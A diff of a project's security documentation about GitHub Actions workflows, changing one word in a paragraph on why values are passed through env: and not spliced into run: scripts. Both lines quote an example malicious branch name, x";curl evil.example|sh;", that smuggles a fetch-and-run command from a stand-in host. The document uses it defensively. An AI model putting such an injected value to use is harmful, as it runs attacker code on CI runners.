@@ -186,7 +186,7 @@ Beyond the summary at the top of this page, these gaps remain:
 
 (r153)=
 
-A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L84-L93) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/workflow-guards.test.ts`](src:test/workflow-guards.test.ts#L217-L220) fails on any frozen `run:` containing `${{`, to avoid this weakness "class" in the future.
+A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L84-L93) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/workflow-guards.test.ts`](src:test/workflow-guards.test.ts#L217-L220) fails on any engine-managed `run:` containing `${{`, to avoid this weakness "class" in the future.
 
 (r155)=
 
